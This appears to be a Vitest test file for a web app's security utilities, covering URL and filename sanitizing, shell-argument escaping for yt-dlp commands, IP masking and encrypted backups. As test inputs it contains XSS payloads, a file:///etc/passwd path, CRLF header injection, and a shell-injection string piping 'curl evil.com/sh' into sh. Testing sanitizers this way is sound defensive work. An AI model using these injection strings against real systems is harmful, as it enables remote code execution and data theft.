import { describe, it, expect, beforeEach } from 'vitest';
import { 
  isValidHttpUrl, 
  sanitizeRedirectUrl, 
  sanitizeDownloadUrl,
  sanitizeFileName, 
  isDangerousFileExtension,
  escapeShellArg,
  maskIpAddress,
  generateSecureRandomString,
  generateSecureId
} from '@/utils/security';
import { getYtDlpCommand } from '@/services/mediaService';
import { encryptPayload, decryptPayload, isEncryptedEnvelope } from '@/services/cryptoService';
import { dataService } from '@/services/dataService';

describe('Security & Sanitization Utilities', () => {
  describe('isValidHttpUrl Protocol Enforcement', () => {
    it('accepts valid HTTP and HTTPS URLs', () => {
      expect(isValidHttpUrl('https://example.com')).toBe(true);
      expect(isValidHttpUrl('http://example.com/path?query=1')).toBe(true);
      expect(isValidHttpUrl('https://apps.k31.my.id/dashboard')).toBe(true);
    });

    it('strictly blocks javascript: URI protocol smuggling / stored XSS', () => {
      expect(isValidHttpUrl('javascript:alert(document.cookie)')).toBe(false);
      expect(isValidHttpUrl('JAVASCRIPT:alert(1)')).toBe(false);
      expect(isValidHttpUrl('javascript://alert(1)')).toBe(false);
    });

    it('strictly blocks data: URI scheme injection', () => {
      expect(isValidHttpUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
      expect(isValidHttpUrl('data:image/svg+xml;base64,PHN2Z...')).toBe(false);
    });

    it('strictly blocks file:, vbscript:, and about: schemes', () => {
      expect(isValidHttpUrl('file:///etc/passwd')).toBe(false);
      expect(isValidHttpUrl('file:///C:/Windows/System32')).toBe(false);
      expect(isValidHttpUrl('vbscript:msgbox(1)')).toBe(false);
      expect(isValidHttpUrl('about:blank')).toBe(false);
    });

    it('rejects CRLF and header injection attempts', () => {
      expect(isValidHttpUrl('https://example.com\r\nSet-Cookie:evil=1')).toBe(false);
      expect(isValidHttpUrl('https://example.com\nBad-Header')).toBe(false);
    });

    it('rejects empty, malformed, or relative strings', () => {
      expect(isValidHttpUrl('')).toBe(false);
      expect(isValidHttpUrl('   ')).toBe(false);
      expect(isValidHttpUrl('not a url')).toBe(false);
      expect(isValidHttpUrl('/local/path')).toBe(false);
    });
  });

  describe('sanitizeRedirectUrl & sanitizeDownloadUrl', () => {
    it('returns normalized href for safe URLs', () => {
      expect(sanitizeRedirectUrl('https://google.com')).toBe('https://google.com/');
      expect(sanitizeRedirectUrl('https://github.com/krisna31/superapps')).toBe('https://github.com/krisna31/superapps');
    });

    it('returns null for malicious or unparseable URLs', () => {
      expect(sanitizeRedirectUrl('javascript:alert(1)')).toBeNull();
      expect(sanitizeRedirectUrl('data:text/html,evil')).toBeNull();
      expect(sanitizeRedirectUrl('invalid')).toBeNull();
    });

    it('sanitizeDownloadUrl allows safe data/blob URLs for offline files while blocking HTML/SVG/JS XSS', () => {
      expect(sanitizeDownloadUrl('https://cdn.example.com/file.pdf')).toBe('https://cdn.example.com/file.pdf');
      expect(sanitizeDownloadUrl('blob:https://apps.k31.my.id/1234-5678')).toBe('blob:https://apps.k31.my.id/1234-5678');
      expect(sanitizeDownloadUrl('data:text/plain;base64,SGVsbG8=')).toBe('data:text/plain;base64,SGVsbG8=');
      expect(sanitizeDownloadUrl('data:text/html;base64,PHNjcmlwdD4=')).toBeNull();
      expect(sanitizeDownloadUrl('data:image/svg+xml;base64,PHN2Zz4=')).toBeNull();
      expect(sanitizeDownloadUrl('javascript:alert(1)')).toBeNull();
    });
  });

  describe('sanitizeFileName Path Traversal Protection', () => {
    it('strips directory traversal prefixes (../ and ..\\)', () => {
      expect(sanitizeFileName('../../etc/passwd')).toBe('passwd');
      expect(sanitizeFileName('..\\..\\Windows\\System32\\cmd.exe')).toBe('cmd.exe');
      expect(sanitizeFileName('folder/subfolder/document.pdf')).toBe('document.pdf');
    });

    it('replaces dangerous and illegal characters with underscores', () => {
      expect(sanitizeFileName('my file (1) [final] <test>.png')).toBe('my_file__1___final___test_.png');
      expect(sanitizeFileName('photo;rm -rf;.jpg')).toBe('photo_rm_-rf_.jpg');
    });

    it('removes leading dots to prevent hidden/system file creation', () => {
      expect(sanitizeFileName('.env')).toBe('env');
      expect(sanitizeFileName('...htaccess')).toBe('htaccess');
    });

    it('provides fallback name if input is empty or invalid', () => {
      expect(sanitizeFileName('')).toBe('unnamed_file');
    });
  });

  describe('isDangerousFileExtension Executable & Active Web Content Blocking', () => {
    it('flags executable and dangerous script/web extensions including .svg and .html', () => {
      expect(isDangerousFileExtension('payload.exe')).toBe(true);
      expect(isDangerousFileExtension('script.bat')).toBe(true);
      expect(isDangerousFileExtension('installer.sh')).toBe(true);
      expect(isDangerousFileExtension('exploit.vbs')).toBe(true);
      expect(isDangerousFileExtension('script.ps1')).toBe(true);
      expect(isDangerousFileExtension('evil.scr')).toBe(true);
      expect(isDangerousFileExtension('xss.svg')).toBe(true);
      expect(isDangerousFileExtension('phish.html')).toBe(true);
      expect(isDangerousFileExtension('phish.htm')).toBe(true);
      expect(isDangerousFileExtension('payload.xhtml')).toBe(true);
      expect(isDangerousFileExtension('xxe.xml')).toBe(true);
    });

    it('allows safe document, media, and archive extensions', () => {
      expect(isDangerousFileExtension('image.png')).toBe(false);
      expect(isDangerousFileExtension('photo.jpg')).toBe(false);
      expect(isDangerousFileExtension('document.pdf')).toBe(false);
      expect(isDangerousFileExtension('notes.txt')).toBe(false);
      expect(isDangerousFileExtension('video.mp4')).toBe(false);
      expect(isDangerousFileExtension('backup.zip')).toBe(false);
    });
  });

  describe('escapeShellArg & getYtDlpCommand CLI Injection Protection', () => {
    it('escapes shell metacharacters and strips control characters', () => {
      const malicious = 'https://example.com/video"\r\n && curl evil.com/sh | sh # $(whoami) `id`';
      const escaped = escapeShellArg(malicious);
      expect(escaped).not.toContain('\r');
      expect(escaped).not.toContain('\n');
      expect(escaped).toContain('\\"');
      expect(escaped).toContain('\\$');
      expect(escaped).toContain('\\`');
    });

    it('generates safe yt-dlp command with -- option terminator and rejects non-HTTP URLs', () => {
      const cmd = getYtDlpCommand('https://www.youtube.com/watch?v=dQw4w9WgXcQ', 'auto');
      expect(cmd).toBe('yt-dlp -f "bv*+ba/b" -- "https://www.youtube.com/watch?v=dQw4w9WgXcQ"');

      const audioCmd = getYtDlpCommand('https://www.youtube.com/watch?v=dQw4w9WgXcQ', 'audio');
      expect(audioCmd).toBe('yt-dlp -x --audio-format mp3 -- "https://www.youtube.com/watch?v=dQw4w9WgXcQ"');

      const badCmd = getYtDlpCommand('javascript:alert(1)', 'auto');
      expect(badCmd).toContain('# Invalid URL');
    });
  });

  describe('maskIpAddress Privacy Anonymization', () => {
    it('masks the last octet of IPv4 addresses', () => {
      expect(maskIpAddress('114.122.104.210')).toBe('114.122.104.xxx');
      expect(maskIpAddress('8.8.8.8')).toBe('8.8.8.xxx');
    });

    it('masks IPv6 addresses to the first 3 hextets', () => {
      expect(maskIpAddress('2001:0db8:85a3:0000:0000:8a2e:0370:7334')).toBe('2001:0db8:85a3::xxx');
    });

    it('returns Unknown for empty or invalid IP inputs', () => {
      expect(maskIpAddress(undefined)).toBe('Unknown');
      expect(maskIpAddress('')).toBe('Unknown');
    });
  });

  describe('CSPRNG Helpers (generateSecureRandomString & generateSecureId)', () => {
    it('generates unbiased random strings of exact requested length and charset', () => {
      const str = generateSecureRandomString(24, 'ABC123');
      expect(str).toHaveLength(24);
      expect(/^[ABC123]+$/.test(str)).toBe(true);
    });

    it('generates prefixed secure IDs', () => {
      const id = generateSecureId('guest', 10);
      expect(id.startsWith('guest-')).toBe(true);
      expect(id.length).toBe(6 + 10);
    });
  });

  describe('AES-GCM 256-bit Client-Side Backup Encryption (cryptoService)', () => {
    it('encrypts and decrypts workspace backup payload roundtrip with passphrase', async () => {
      const samplePlaintext = JSON.stringify({ version: '1.0.0', notes: [{ id: 'n1', title: 'Secret' }] });
      const envelope = await encryptPayload(samplePlaintext, 'correct-horse-battery-staple');

      expect(isEncryptedEnvelope(envelope)).toBe(true);
      expect(envelope.algorithm).toBe('AES-GCM-256');
      expect(envelope.kdf).toBe('PBKDF2-SHA256');
      expect(envelope.ciphertext).not.toContain('Secret');

      const decrypted = await decryptPayload(envelope, 'correct-horse-battery-staple');
      expect(decrypted).toBe(samplePlaintext);
    });

    it('throws an error when decrypting with an incorrect passphrase', async () => {
      const envelope = await encryptPayload('{"secret":true}', 'right-passphrase');
      await expect(decryptPayload(envelope, 'wrong-passphrase')).rejects.toThrow(
        /Decryption failed/i
      );
    });
  });

  describe('importWorkspaceBackup Runtime Schema Validation', () => {
    beforeEach(() => {
      localStorage.clear();
    });

    it('sanitizes valid items and drops malformed or XSS-injected backup entries', async () => {
      const userId = 'guest-sec-test';
      await dataService.importWorkspaceBackup(userId, {
        version: '1.0.0',
        exportedAt: Date.now(),
        exportedBy: userId,
        data: {
          tasks: [
            { id: 't-valid', title: 'Valid Task', status: 'in_progress', priority: 'high' },
            { id: '', title: '' }, // invalid: empty title
            null,
            'malformed-string-item'
          ],
          expenses: [
            { id: 'e-valid', title: 'Coffee', amount: 35000, type: 'expense', category: 'Food' },
            { id: 'e-nan', title: 'Bad Amount', amount: 'not-a-number', type: 'expense' }
          ],
          dropzone: [
            { id: 'f-safe', fileName: '../../safe_doc.pdf', fileSize: 1024, mimeType: 'application/pdf', downloadUrl: 'https://example.com/safe.pdf' },
            { id: 'f-xss', fileName: 'evil.png', fileSize: 100, mimeType: 'image/png', downloadUrl: 'javascript:alert(1)' },
            { id: 'f-svg', fileName: 'xss.svg', fileSize: 100, mimeType: 'image/svg+xml', downloadUrl: 'https://example.com/xss.svg' }
          ],
          shortlinks: [
            { id: 's-safe', slug: 'my-safe-slug', originalUrl: 'https://apps.k31.my.id' },
            { id: 's-xss', slug: 'bad-slug', originalUrl: 'javascript:alert(document.domain)' }
          ]
        }
      } as any);

      const tasks = await dataService.getTasks(userId);
      expect(tasks).toHaveLength(1);
      expect(tasks[0].title).toBe('Valid Task');

      const expenses = await dataService.getExpenses(userId);
      expect(expenses).toHaveLength(1);
      expect(expenses[0].amount).toBe(35000);

      const files = await dataService.getDropzoneItems(userId);
      expect(files).toHaveLength(1);
      expect(files[0].fileName).toBe('safe_doc.pdf');

      const shortlinks = await dataService.getShortlinks(userId);
      expect(shortlinks).toHaveLength(1);
      expect(shortlinks[0].slug).toBe('my-safe-slug');
    });
  });
});
